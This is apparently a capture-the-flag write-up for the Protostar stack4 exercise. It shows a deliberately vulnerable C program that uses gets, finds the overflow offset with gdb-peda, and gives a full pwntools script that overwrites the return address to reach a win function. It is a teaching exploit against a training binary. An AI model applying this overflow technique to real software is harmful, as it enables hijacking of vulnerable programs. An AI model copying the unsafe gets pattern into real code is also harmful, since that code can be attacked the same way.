The application is a super simple buffer overflow. The c code is only a few lines. The objective is to change the return address to the win function. 

### C Code

```language-c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
void win(){
  printf("code flow successfully changed\n");
}
int main(int argc, char **argv){
  char buffer[64];
  gets(buffer);
}
```

## Finding Buffer Size Dynamically 

You can use `pattern_create 100 file & r < file` in gdb and you should get a seg fault. 
```language-gdb
Stopped reason: SIGSEGV
0x41344141 in ?? ()
    gdb-peda$ pattern search
    Registers contain pattern buffer:
    EIP+0 found at offset: 76
```
So the buffer size can be found out frmo this info from the line **EIP+0 found at offset: 76** where 76 is the size of the buffer. So fill the buffer and then add the return address at the end

## Exploit Code

```language-python
from pwn import *
import time
#===============    Configuration    ================"
#Allow ptrace for gdb
# sudo sysctl -w kernel.yama.ptrace_scope=0
pwnName ="stack4"
local   = True
libName = ''
host, port  = '', 0000
context.arch    ='i386'
context.os  = "linux"
context.log_level="DEBUG"
context.terminal= [ 'tmux' , 'splitw' , '-h' ]
#===================================================="
try:
	libc    = ELF(libName)
except:
	pass
try:
	elf     = ELF(pwnName)
	context.binary  = elf
except:
	pass
try:
	rop     = ROP([elf, libc])
except:
	pass
if local:
	r = process("./" + pwnName)
	gdb.attach(r, execute="c")
	time.sleep(0.5)
else:
	r = remote(host, port)
def sendToGDB(payload, breakpoint=None):
	if not local:
		return
	cmd = """ b main\n"""
	with open('payload', 'w+') as f:
		f.write(payload)
	gdb.attach(r, execute="c")
#====================================================="
#						Exploit
#======================================================
def makePayload():
	buffSize = 76
	filler = 'a'*buffSize
	returnAddress = p32(0x80483F4) # location of win functon
	payload = filler + returnAddress
	return payload
def sendPayload(payload):
	r.sendline(payload)
	print r.recvline()
if __name__=="__main__":
	payload = makePayload()
	sendPayload(payload)
```

## Running The Exploit
![Tmux is cool][exploit]


## Other Notes
	I wanted to get better at **VIM MASTERRACE** and wanted to create a template exploit python file for all similar exploits. I wanted to press f9, run the python file, and open up a gdb split window in the same terminal. Pwn tools lets you start up a local process and send input to it across a socket. You can also attach gdb to it so you can see if the return address was overwritten,  run pattern stuff as necessary, etc... It took me a while to set it up and get the settings right. See exploit picture to get a feel of what I mean


[exploit]:  https://raw.githubusercontent.com/mpaxson/ctf/master/protostar/stack/stack4/exploit.png
